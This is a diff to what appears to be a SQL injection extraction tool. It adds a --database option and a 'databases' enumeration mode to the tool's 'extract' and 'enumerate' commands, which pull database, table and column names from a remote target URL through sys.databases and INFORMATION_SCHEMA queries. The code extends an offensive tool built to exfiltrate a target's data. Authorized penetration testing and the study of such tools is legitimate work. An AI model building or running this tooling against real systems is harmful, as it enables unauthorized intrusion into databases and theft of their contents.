@@ -92,13 +92,17 @@ def build_parser() -> argparse.ArgumentParser:
                     help="scalar SQL subquery to exfiltrate")
     ex.add_argument("--preset", choices=["first-table", "db-name"],
                     help="use a built-in target instead of --expr")
+    ex.add_argument("--database", dest="database",
+                    help="for --preset first-table: read this database's catalog")
     ex.add_argument("--output", dest="output_file")
 
     en = sub.add_parser("enumerate", help="extract every value of a metadata set (e.g. all table names)")
     add_common(en)
-    en.add_argument("--what", choices=["tables", "columns"], default="tables",
+    en.add_argument("--what", choices=["databases", "tables", "columns"], default="tables",
                     help="what to enumerate (default: tables)")
     en.add_argument("--table", dest="table", help="table name (required for --what columns)")
+    en.add_argument("--database", dest="database",
+                    help="scope tables/columns to this database (default: the current one)")
     en.add_argument("--limit", dest="limit", type=int, default=0, help="max rows (0 = all)")
     en.add_argument("--max-count", dest="max_count", type=int, default=4096)
     en.add_argument("--charset", dest="charset")
@@ -120,7 +124,7 @@ def _apply_overrides(cfg: Config, args: argparse.Namespace) -> Config:
         "max_length", "strategy", "discover_length", "target_name",
         "target_expression", "output_file", "allow_nonlocal", "collation",
         "proxy", "proxy_insecure", "body_mode", "body_template", "content_type",
-        "knowledge_file",
+        "knowledge_file", "database",
     ]
     for f in fields:
         val = getattr(args, f, None)
@@ -150,7 +154,7 @@ def _build_target(cfg: Config, args: argparse.Namespace):
         dialect.collation = cfg.collation or None
     preset = getattr(args, "preset", None)
     if preset == "first-table":
-        return targets_mod.first_table_name(dialect)
+        return targets_mod.first_table_name(dialect, database=cfg.database)
     if preset == "db-name":
         return targets_mod.database_name(dialect)
     return targets_mod.custom(dialect, cfg.target_name, cfg.target_expression)
@@ -237,16 +241,21 @@ def cmd_enumerate(cfg: Config, args: argparse.Namespace, logger: Logger) -> int:
         dialect.collation = cfg.collation or None
 
     what = getattr(args, "what", "tables")
-    if what == "columns":
+    database = cfg.database
+    catalog = targets_mod._catalog_prefix(database) if database else ""
+    if what == "databases":
+        count_expr = "(SELECT COUNT(*) FROM sys.databases)"
+        row = lambda i: targets_mod.nth_database_name(dialect, offset=i)
+    elif what == "columns":
         if not getattr(args, "table", None):
             logger.error("--what columns requires --table")
             return 2
         tbl = args.table.replace("'", "''")
-        count_expr = f"(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='{tbl}')"
-        row = lambda i: targets_mod.first_column_name(dialect, args.table, offset=i)
+        count_expr = f"(SELECT COUNT(*) FROM {catalog}INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='{tbl}')"
+        row = lambda i: targets_mod.first_column_name(dialect, args.table, offset=i, database=database)
     else:
-        count_expr = "(SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES)"
-        row = lambda i: targets_mod.first_table_name(dialect, offset=i)
+        count_expr = f"(SELECT COUNT(*) FROM {catalog}INFORMATION_SCHEMA.TABLES)"
+        row = lambda i: targets_mod.first_table_name(dialect, offset=i, database=database)
 
     logger.info(f"Enumerating {what} from {cfg.target_url}")
     try:
